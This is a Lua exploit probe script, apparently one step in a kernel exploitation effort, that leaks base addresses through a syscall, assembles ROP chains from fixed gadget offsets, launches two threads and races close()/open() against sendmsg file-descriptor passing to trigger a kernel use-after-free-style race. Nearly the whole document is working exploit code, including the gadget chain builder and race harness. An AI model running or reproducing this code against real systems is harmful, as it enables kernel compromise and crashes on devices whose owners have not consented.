-- CRASH_CLASS: HIGH
-- PROBE 534f: fd-close/sendmsg race — 500 iterations
--
-- 534e worked (20 iter) but drained=0 — threads don't overlap enough.
-- Scale to 500 iterations for more race window coverage.
-- Also: T1 stores sendmsg rv into shared mem for first few calls
-- to verify sends are actually happening.

print("=== PROBE 534f: RACE 500 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end

local sc_mmap = make_syscall(477)
local sc_socketpair = make_syscall(135)
local sc_close = make_syscall(6)
local sc_nanosleep = make_syscall(240)
local sc_455 = make_syscall(455)
local sc_recvmsg = make_syscall(27)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local pop_rdx_ret = eb + uint64(0x3B02D7)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret = eb + uint64(0x42)
local fn_addr = lk + uint64(0xB57)

local devnull = memory.alloc(16); zero(devnull, 16)
write_string(devnull, "/dev/null\0")

local sv = memory.alloc(8)
zero(sv, 8)
pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local tx_fd = rd(sv); local rx_fd = rd(sv + 4)

zero(sv, 8)
pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local target_fd = rd(sv); local target_peer = rd(sv + 4)
print("tx=" .. tx_fd .. " rx=" .. rx_fd .. " tgt=" .. target_fd .. " peer=" .. target_peer)

-- shared: +0x00=t1 done, +0x04..+0x24=t1 rv samples (8),
--         +0x40=t2 done, +0x44..+0x64=t2 close rv samples (8)
local shared = memory.alloc(0x100); zero(shared, 0x100)

-- sendmsg structures
local iov_data = memory.alloc(8); wq(iov_data, uint64(0x41))
local iov_s = memory.alloc(16); wq(iov_s, uint64(iov_data)); wq(iov_s + 8, uint64(1))
local cmsg = memory.alloc(32); zero(cmsg, 32)
wd(cmsg, 16); wd(cmsg + 4, 0xFFFF); wd(cmsg + 8, 1); wd(cmsg + 12, target_fd)
local mhdr = memory.alloc(64); zero(mhdr, 64)
wq(mhdr + 0x10, uint64(iov_s)); wd(mhdr + 0x18, 1)
wq(mhdr + 0x20, uint64(cmsg)); wd(mhdr + 0x28, 24)

local r_cmsg = memory.alloc(32)
local r_iov_d = memory.alloc(8)
local r_iov = memory.alloc(16); wq(r_iov, uint64(r_iov_d)); wq(r_iov + 8, uint64(8))
local r_mh = memory.alloc(64)

local function make_tcb()
    local ok_t, p = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

local function build_thread(chain_fn)
    local map_size = 0x200000
    local ok_m, base = pcall(function()
        return sc_mmap(uint64(0), uint64(map_size), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local base_n = to_num(base)
    local tcb = make_tcb()
    local mid = base_n + 0x100000
    local write_pos = mid - 8
    local offset = 0
    local function emit(v) wq(uint64(write_pos + offset), v); offset = offset + 8 end

    emit(pop_rax_ret); emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb)
    emit(fn_addr)

    chain_fn(emit)

    emit(pop_rax_ret); emit(uint64(431))
    emit(pop_rdi_ret); emit(uint64(0))
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(0x100008))
    return tp, offset
end

local ITERS = 500

-- Thread 1: sendmsg loop with rv sampling
local tp1, sz1 = build_thread(function(emit)
    for iter = 0, ITERS - 1 do
        emit(pop_rax_ret); emit(uint64(28))
        emit(pop_rdi_ret); emit(uint64(tx_fd))
        emit(pop_rsi_ret); emit(uint64(mhdr))
        emit(pop_rdx_ret); emit(uint64(0))
        emit(fn_addr)
        -- Store rv for first 8 iterations
        if iter < 8 then
            emit(pop_rdi_ret); emit(shared + 4 + iter * 4)
            emit(mov_rdi_rax_ret)
        end
    end
    emit(pop_rax_ret); emit(uint64(ITERS))
    emit(pop_rdi_ret); emit(shared)
    emit(mov_rdi_rax_ret)
end)

-- Thread 2: close + open loop with rv sampling
local tp2, sz2 = build_thread(function(emit)
    for iter = 0, ITERS - 1 do
        emit(pop_rax_ret); emit(uint64(6))
        emit(pop_rdi_ret); emit(uint64(target_fd))
        emit(fn_addr)
        if iter < 8 then
            emit(pop_rdi_ret); emit(shared + 0x44 + iter * 4)
            emit(mov_rdi_rax_ret)
        end
        emit(pop_rax_ret); emit(uint64(5))
        emit(pop_rdi_ret); emit(uint64(devnull))
        emit(pop_rsi_ret); emit(uint64(2))
        emit(pop_rdx_ret); emit(uint64(0))
        emit(fn_addr)
    end
    emit(pop_rax_ret); emit(uint64(ITERS))
    emit(pop_rdi_ret); emit(shared + 0x40)
    emit(mov_rdi_rax_ret)
end)

print("t1=" .. sz1 .. "B t2=" .. sz2 .. "B iters=" .. ITERS)
print("[LAUNCH]")
pcall(function() sc_455(uint64(tp1), uint64(0x38)) end)
pcall(function() sc_455(uint64(tp2), uint64(0x38)) end)

-- Wait 5s for 500 iterations
local ts = memory.alloc(16); wq(ts, uint64(5)); wq(ts + 8, uint64(0))
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local t1_done = rd(shared)
local t2_done = rd(shared + 0x40)
print("t1=" .. (t1_done or "nil") .. " t2=" .. (t2_done or "nil"))

-- Show rv samples
local t1_rvs = ""
for j = 0, 7 do
    local v = rd(shared + 4 + j * 4)
    if v then
        if v < 0 then v = v + 0x100000000 end
        t1_rvs = t1_rvs .. v .. " "
    end
end
print("t1_rvs: " .. t1_rvs)

local t2_rvs = ""
for j = 0, 7 do
    local v = rd(shared + 0x44 + j * 4)
    if v then
        if v < 0 then v = v + 0x100000000 end
        t2_rvs = t2_rvs .. v .. " "
    end
end
print("t2_rvs: " .. t2_rvs)

-- Drain
print("[DRAIN]")
local drained = 0; local anomalies = 0
for d = 1, ITERS * 2 do
    zero(r_cmsg, 32); zero(r_mh, 64)
    wq(r_mh + 0x10, uint64(r_iov)); wd(r_mh + 0x18, 1)
    wq(r_mh + 0x20, uint64(r_cmsg)); wd(r_mh + 0x28, 32)
    local ok_r, rrv = pcall(function()
        return sc_recvmsg(uint64(rx_fd), uint64(r_mh), uint64(0x80))
    end)
    if not ok_r or to_num(rrv) < 0 then break end
    drained = drained + 1
    local rfd = rd(r_cmsg + 12)
    if rfd and rfd > 0 and rfd ~= target_fd then
        anomalies = anomalies + 1
        if anomalies <= 10 then
            print(string.format("  *** fd=%d (exp %d) ***", rfd, target_fd))
        end
    end
    if rfd and rfd > 0 then pcall(function() sc_close(uint64(rfd)) end) end
end
print("  drained=" .. drained .. " anomaly=" .. anomalies)

local ok_pid, pid = pcall(function() return make_syscall(20)() end)
print("pid=" .. (ok_pid and to_num(pid) or "FAIL"))

pcall(function() sc_close(uint64(tx_fd)) end)
pcall(function() sc_close(uint64(rx_fd)) end)
pcall(function() sc_close(uint64(target_peer)) end)
print("=== 534f DONE ===")
